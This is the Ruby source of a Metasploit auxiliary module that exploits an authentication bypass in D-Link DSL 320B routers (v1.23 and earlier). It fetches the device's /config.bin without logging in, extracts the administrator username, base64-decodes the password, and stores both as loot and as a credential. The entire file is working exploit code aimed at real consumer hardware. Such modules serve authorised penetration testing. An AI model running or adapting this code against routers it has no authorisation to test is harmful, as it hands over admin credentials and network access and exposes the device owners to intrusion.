##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'D-Link DSL 320B Password Extractor',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in D-Link DSL 320B
        <=v1.23. This vulnerability allows to extract the credentials for the remote
        management interface.
      },
      'References' => [
        [ 'EDB', '25252' ],
        [ 'OSVDB', '93013' ],
        [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ]
      ],
      'Author' => [
        'Michael Messner <devnull[at]s3cur1ty.de>'
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    )
  end

  def run
    vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

    # download configuration
    res = send_request_cgi({
      'uri' => '/config.bin',
      'method' => 'GET'
    })

    return if res.nil?
    return if res.headers['Server'].nil? || res.headers['Server'] !~ /micro_httpd/
    return if (res.code == 404)

    if res.body =~ /sysPassword value/ || res.body =~ /sysUserName value/
      if res.body !~ /sysPassword value/
        print_status("#{rhost}:#{rport} - Default Configuration of DSL 320B detected - no password section available, try admin/admin")
      else
        print_good("#{rhost}:#{rport} - Credentials successfully extracted")
      end

      # store all details as loot -> there is some useful stuff in the response
      loot = store_loot('dlink.dsl320b.config', 'text/plain', rhost, res.body)
      print_good("#{rhost}:#{rport} - Configuration of DSL 320B downloaded to: #{loot}")

      user = ''
      pass = ''

      res.body.each_line do |line|
        if line =~ %r{<sysUserName\ value="(.*)"/>}
          user = ::Regexp.last_match(1)
          next
        end
        next unless line =~ %r{<sysPassword\ value="(.*)"/>}

        pass = ::Regexp.last_match(1)
        pass = Rex::Text.decode_base64(pass)
        print_good("#{rhost}:#{rport} - Credentials found: #{user} / #{pass}")

        connection_details = {
          module_fullname: fullname,
          username: user,
          private_data: pass,
          private_type: :password,
          workspace_id: myworkspace_id,
          proof: line,
          status: Metasploit::Model::Login::Status::UNTRIED
        }.merge(service_details)
        create_credential_and_login(connection_details)
      end
    end
  rescue ::Rex::ConnectionError
    vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
  end
end
